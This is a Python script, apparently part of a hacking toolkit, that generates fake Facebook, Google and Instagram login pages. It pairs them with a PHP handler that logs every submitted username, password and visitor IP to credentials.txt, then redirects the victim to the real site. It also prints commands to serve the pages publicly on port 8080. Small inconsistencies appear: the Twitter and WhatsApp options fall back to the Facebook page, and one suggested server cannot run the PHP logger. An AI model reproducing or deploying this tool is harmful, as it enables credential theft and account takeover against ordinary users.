#!/usr/bin/env python3
# PHISHING PAGE GENERATOR - Buat halaman palsu

import os
import json
from core.colors import Colors

class PhishingGenerator:
    def __init__(self):
        self.name = "Phishing Page Generator"
        self.output_dir = os.path.expanduser("~/duality_phishing")
        os.makedirs(self.output_dir, exist_ok=True)
        
        self.templates = {
            "facebook": {
                "name": "Facebook",
                "file": "facebook.html",
                "fields": ["email", "pass"]
            },
            "google": {
                "name": "Google",
                "file": "google.html",
                "fields": ["email", "pass"]
            },
            "instagram": {
                "name": "Instagram",
                "file": "instagram.html",
                "fields": ["username", "password"]
            },
            "twitter": {
                "name": "Twitter",
                "file": "twitter.html",
                "fields": ["username", "password"]
            },
            "whatsapp": {
                "name": "WhatsApp Web",
                "file": "whatsapp.html",
                "fields": ["phone", "password"]
            }
        }
    
    def generate_facebook(self):
        return """<!DOCTYPE html>
<html>
<head><title>Facebook - Login</title></head>
<body style="text-align:center;font-family:Arial">
    <h1>Facebook</h1>
    <form method="POST" action="login.php">
        <input type="text" name="email" placeholder="Email or Phone" required><br><br>
        <input type="password" name="pass" placeholder="Password" required><br><br>
        <button type="submit">Log In</button>
    </form>
    <p>Forgot password?</p>
</body>
</html>"""

    def generate_google(self):
        return """<!DOCTYPE html>
<html>
<head><title>Google - Sign in</title></head>
<body style="text-align:center;font-family:Arial">
    <h1>Google</h1>
    <form method="POST" action="login.php">
        <input type="email" name="email" placeholder="Email" required><br><br>
        <input type="password" name="pass" placeholder="Password" required><br><br>
        <button type="submit">Next</button>
    </form>
</body>
</html>"""

    def generate_instagram(self):
        return """<!DOCTYPE html>
<html>
<head><title>Instagram - Login</title></head>
<body style="text-align:center;font-family:Arial">
    <h1>Instagram</h1>
    <form method="POST" action="login.php">
        <input type="text" name="username" placeholder="Username" required><br><br>
        <input type="password" name="password" placeholder="Password" required><br><br>
        <button type="submit">Log In</button>
    </form>
</body>
</html>"""

    def generate_php_handler(self):
        return """<?php
$file = fopen("credentials.txt", "a");
fwrite($file, "[" . date("Y-m-d H:i:s") . "] ");
foreach($_POST as $key => $value) {
    fwrite($file, "$key: $value | ");
}
fwrite($file, "IP: " . $_SERVER['REMOTE_ADDR'] . "\\n");
fclose($file);
header("Location: https://www.facebook.com");
exit;
?>"""

    def run(self):
        print(f"\n{Colors.CYAN}[*] {self.name}{Colors.END}")
        print(f"{Colors.GREEN}Available templates:{Colors.END}")
        for key, val in self.templates.items():
            print(f"  {Colors.CYAN}[{key}]{Colors.END} {val['name']}")
        
        choice = input(f"\n{Colors.RED}└─{Colors.WHITE}$ {Colors.END}").lower()
        
        if choice not in self.templates:
            print(f"{Colors.RED}[!] Invalid template!{Colors.END}")
            return
        
        template = self.templates[choice]
        folder = f"{self.output_dir}/{choice}"
        os.makedirs(folder, exist_ok=True)
        
        # Generate HTML
        if choice == "facebook":
            html = self.generate_facebook()
        elif choice == "google":
            html = self.generate_google()
        elif choice == "instagram":
            html = self.generate_instagram()
        else:
            html = self.generate_facebook()
        
        # Save files
        with open(f"{folder}/index.html", 'w') as f:
            f.write(html)
        with open(f"{folder}/login.php", 'w') as f:
            f.write(self.generate_php_handler())
        
        print(f"\n{Colors.GREEN}[+] Phishing page created!{Colors.END}")
        print(f"{Colors.CYAN}📍 Location: {folder}{Colors.END}")
        print(f"{Colors.YELLOW}[!] Start server: cd {folder} && php -S 0.0.0.0:8080{Colors.END}")
        print(f"{Colors.YELLOW}[!] Or: python3 -m http.server 8080{Colors.END}")

if __name__ == "__main__":
    tool = PhishingGenerator()
    tool.run()
